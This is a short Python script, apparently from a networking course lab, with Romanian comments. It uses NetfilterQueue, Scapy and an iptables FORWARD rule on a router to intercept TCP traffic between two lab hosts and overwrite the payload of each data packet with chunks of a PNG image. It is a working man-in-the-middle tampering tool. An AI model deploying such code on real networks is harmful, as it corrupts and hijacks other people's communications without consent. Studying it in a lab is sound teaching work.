# COD DE BAZA: https://github.com/senisioi/computer-networks/tree/2022/capitolul6
import os
from netfilterqueue import NetfilterQueue as NFQ
from scapy.all import IP, UDP, DNSQR, DNSRR, DNS, TCP

def alter_packet(packet):
    global poza
    packet[TCP].payload = poza.read(1024)       # in client si server se trimit si se primesc cate 1024
                                        # bytes, deci atat de multi citim si trimitem si noi
    return packet


def detect_and_alter_packet(packet):
    """Functie care se apeleaza pentru fiecare pachet din coada
    """
    global flagPSH
    octets = packet.get_payload()
    scapy_packet = IP(octets)

    # prin router trec sute de pachete, deci 
        # filtram dupa clientul si serverul vizat
    if scapy_packet[IP].src in ('10.0.2.15', '10.0.2.4') and scapy_packet[IP].dst in ('10.0.2.15', '10.0.2.4') and scapy_packet.haslayer(TCP):
        
        if scapy_packet['TCP'].flags & flagPSH:     # are push setat => se trimit date
            print("[Before]:", scapy_packet.summary())
            # noul scapy_packet este modificat cu functia alter_packet
            scapy_packet = alter_packet(scapy_packet)
            print("[After ]:", scapy_packet.summary())
            # extragem octetii din pachet
            octets = bytes(scapy_packet)
            # il punem inapoi in coada modificat
            packet.set_payload(octets)
    # apelam accept pentru fiecare pachet din coada
    packet.accept()

queue = NFQ()
poza = open("poza_router.png", 'rb')
flagPSH = 0x08
dimPoza = os.path.getsize("poza_router.png")
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()